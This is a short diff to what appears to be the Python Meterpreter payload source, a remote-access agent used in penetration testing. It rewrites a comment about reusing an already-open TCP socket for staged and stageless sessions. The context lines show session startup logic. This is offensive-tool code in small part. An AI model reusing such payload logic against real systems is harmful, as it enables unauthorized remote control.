@@ -2304,11 +2304,12 @@ if not _try_to_fork or (_try_to_fork and os.fork() == 0):
             _dbg_fh.setLevel(logging.DEBUG)
             logging.getLogger().addHandler(_dbg_fh)
     transport = config['transports'][0]
-    # For staged TCP payloads, the stager has already established the socket
-    # connection, so bind it to the first transport instead of reconnecting.
+    # PATCH-SETUP-STAGELESS-TCP-SOCKET #
+    # For staged/stageless TCP payloads where the socket `s` is already
+    # established (by the stager or by the patched code above), bind it
+    # to the transport instead of reconnecting.
     if isinstance(transport, TcpTransport) and 's' in globals():
         transport.socket = s
-    # PATCH-SETUP-STAGELESS-TCP-SOCKET #
     met = PythonMeterpreter(transport)
     met.session_expiry_time = config['session_expiry']
     met.session_expiry_end = time.time() + config['session_expiry']
